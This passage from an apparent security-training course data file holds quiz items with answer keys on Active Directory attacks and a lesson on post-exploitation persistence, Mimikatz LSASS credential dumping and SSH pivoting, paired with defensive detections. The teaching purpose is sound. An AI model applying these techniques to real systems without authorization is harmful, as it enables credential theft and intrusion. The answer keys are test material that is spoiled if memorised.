              question: 'Which tool uses graph-theory to map trust relationships, group memberships, and shortest paths to Domain Admin in Active Directory?',
              options: [
                "Wireshark",
                "Nmap",
                "Mimikatz",
                "BloodHound"
              ],
              correctOption: 3,
              explanation: 'BloodHound maps AD pathways, highlighting privilege loops, nested groups, and misconfigured permissions that lead to domain compromise.'
            },
            {
              id: 'q-ad-3',
              question: 'What is "Pass-the-Hash" (PtH) lateral movement?',
              options: [
                "Accelerating offline dictionary cracking against extracted hashes via GPUs.",
                "Capturing unencrypted Net-NTLMv2 challenge traffic on a local LAN.",
                "Reusing a stolen NTLM hash directly to authenticate without cracking.",
                "Injecting forged Kerberos ticket hashes directly into SQL databases."
              ],
              correctOption: 2,
              explanation: 'Windows NTLM authentication accepts password hashes directly. Pass-the-Hash allows attackers to access remote systems using captured hashes directly, bypassing the need to crack them.'
            },
            {
              id: 'q-ad-4',
              question: 'Which Active Directory vulnerability targets accounts that have "Do not require Kerberos preauthentication" enabled, allowing testers to request AS-REP packets and crack hashes offline?',
              options: [
                "AS-REP Roasting",
                "Kerberoasting",
                "Silver Ticket",
                "Kerberos Delegation"
              ],
              correctOption: 0,
              explanation: 'AS-REP Roasting targets accounts lacking preauthentication. Testers request authentication tickets (AS-REP) for these accounts, extracting and cracking the ticket hashes offline.'
            }
          ]
        },
        {
          id: 'post-exploit',
          title: 'Post Exploitation Tactics',
          description: 'Establish persistence, dump credentials using Mimikatz, and pivot through networks.',
          duration: '20 mins',
          content: `### Post Exploitation Tactics

**Difficulty:** Advanced  
**Estimated Study Time:** 20 Minutes  
**Prerequisites:** Privilege Escalation  

#### Learning Objectives
- Identify standard host **Persistence** mechanisms on Windows and Linux (Scheduled Tasks, Registry Run keys, systemd services, authorized SSH keys).
- Explain memory **Credential Dumping** targeting Windows **\`lsass.exe\`** with tools such as **Mimikatz**—and defensive protections like LSA Protection (RunAsPPL) and Windows Defender Credential Guard.
- Design **Network Pivoting** and local SSH port forwarding tunnels to reach segmented internal subnets safely.

#### Why It Matters
Understanding post-exploitation tactics closes the loop between offensive engagements and Incident Response/Detection Engineering. Every persistence key, memory read against LSASS, and internal proxy tunnel creates forensic evidence that skilled SOC analysts and digital forensics teams hunt for immediately.

#### Prerequisites & Connections
This capstone offensive module follows **Privilege Escalation** (alongside **Active Directory Exploitation**) and connects directly back to **Digital Forensics Analysis**, **Incident Response & Threat Hunting**, and **Defensive Frameworks & AAA**.

#### Core Explanation
After escalating privileges on a compromised dual-homed or domain-joined host, assessments examine three operational areas:
- **Persistence:** Techniques keeping access across reboots or credential resets—on Windows via **Scheduled Tasks** or **Registry Run keys** (\`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`), and on Linux via cron entries, systemd units, or appending entries to \`~/.ssh/authorized_keys\`.
- **Credential Dumping:** Extracts active session secrets, NTLM hashes, and Kerberos tickets from Windows memory—specifically the **Local Security Authority Subsystem Service (\`lsass.exe\`)**—using utilities like **Mimikatz**.
- **Pivoting & Port Forwarding:** Uses a compromised host with reachability into segmented VLANs as an encrypted relay hop (via SSH \`-L\`/\`-D\` dynamic SOCKS proxies or tools like Chisel) so isolated internal ports can be inspected without direct external exposure.

#### How It Works
With local port forwarding (\`ssh -L 8080:198.51.100.50:80 operator@pivot.example.internal\`), traffic sent to \`127.0.0.1:8080\` on the authorized testing workstation enters an encrypted SSH tunnel to \`pivot.example.internal\`, which forwards it onward to isolated internal host \`198.51.100.50:80\`. Meanwhile, defenders monitor Sysmon Event ID **10** (unexpected process handles opened to \`lsass.exe\`), Scheduled Task creation (**Event ID 4698**), and unusual SSH/proxy tunnels.

#### Real-World Context
Modern Windows hardened environments run **Credential Guard** (isolating LSASS secrets inside virtualization-based security where even \`SYSTEM\` processes cannot read raw hashes) alongside **LSA Protection (RunAsPPL)**, making classic Mimikatz memory dumps fail unless kernel protections are weakened.

#### Examples
Authorized lab SSH local port forwarding setup and Windows defensive LSASS protection check:
\`\`\`bash
# Forward local port 8080 through an authorized jump host to an isolated target web port
ssh -L 8080:198.51.100.50:80 operator@jump-host.example.internal
\`\`\`
\`\`\`powershell
# Defensive check: verify whether LSA Protection (RunAsPPL) is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
\`\`\`

#### Security Relevance
- **Defensive Value:** Enabling Windows Defender Credential Guard and LSA Protection (\`RunAsPPL\`), alerting on unauthorized reads of \`lsass.exe\`, auditing Scheduled Tasks / Registry Run keys, and strictly segmenting jump hosts blocks post-exploitation lateral reach.
- **Attacker Misuse:** Ransomware and APT operators immediately dump LSASS, install Scheduled Task or service persistence, and tunnel internal discovery traffic through compromised edge servers toward backup and domain controllers.

#### Common Mistakes
- Leaving unauthorized test persistence (scheduled tasks, backdoor accounts, or SSH keys) behind after a penetration test finishes instead of executing full cleanup verification.
- Treating network perimeter firewalls as sufficient when dual-homed servers bridge public DMZs straight into internal production VLANs.
- Overlooking host-level LSASS protections (Credential Guard / Protected Process Light) on Domain Controllers and admin jump hosts.

#### Key Takeaways
- **Mimikatz** targets **\`lsass.exe\`** memory on Windows to extract credentials, NTLM hashes, and Kerberos tickets.
- **Persistence** preserves access across reboots using mechanisms like **Scheduled Tasks** and **Registry Run keys**.
- **Pivoting** routes traffic through a compromised intermediate host to inspect isolated internal subnets.

#### Knowledge Check
- How does Windows Defender Credential Guard stop credential dumping even if an attacker runs as \`NT AUTHORITY\\SYSTEM\`?
- Which Sysmon or Windows Security indicators alert defenders when a scheduled task or Registry Run key is added?
- Explain the traffic path created by \`ssh -L 8080:198.51.100.50:80 user@jump-host\`.

#### Further Learning
Review MITRE ATT&CK **OS Credential Dumping: LSASS Memory (T1003.001)** and Microsoft's Credential Guard architecture guide.`,
          quiz: [
            {
              id: 'q-pext-1',
              question: 'Which post-exploitation tool specializes in extracting cleartext passwords, hashes, and Kerberos tickets from Windows LSASS memory?',
              options: [
                "Wireshark",
                "BloodHound",
                "John the Ripper",
                "Mimikatz"
              ],
              correctOption: 3,
              explanation: 'Mimikatz accesses Windows memory structures (LSASS) to dump plain text passwords, password hashes, and Kerberos tickets.'
            },
            {
              id: 'q-pext-2',
              question: 'What is the purpose of "Pivoting" in penetration testing?',
              options: [
                "To route traffic via a compromised host to reach isolated subnets.",
                "To decrypt volume-level BitLocker backups stored on the target.",
                "To rotate the domain password of the compromised service user.",
                "To escape an isolated hypervisor guest VM onto the physical host."
              ],
              correctOption: 0,
              explanation: 'Pivoting establishes routing pathways through a compromised host, allowing testers to access and test isolated internal network segments.'
            },
            {
              id: 'q-pext-3',
              question: 'Which of the following is a common method for establishing persistence on a Windows host?',
              options: [
                "Enforcing a 16-character domain password complexity Group Policy.",
                "Adding a scheduled task or Registry Run key to survive reboots.",
                "Flushing and restarting the local DNS client resolver service.",
                "Running an active Nmap service version scan across internal hosts."
              ],
              correctOption: 1,
              explanation: 'Scheduled tasks and Registry Run keys are standard Windows persistence vectors: they trigger automatically during system boot or user login.'
            },
            {
              id: 'q-pext-4',
              question: 'Which Windows process is targeted by credential dumping tools like Mimikatz to extract active user session tokens and hashes?',
              options: [
                "services.exe",
                "explorer.exe",
                "lsass.exe",
                "svchost.exe"
              ],
              correctOption: 2,
              explanation: 'The Local Security Authority Subsystem Service (lsass.exe) manages system security and authentication tokens, making it a primary target for credential dumping.'
            }
          ]
        }
      ]
    }
  ]
};
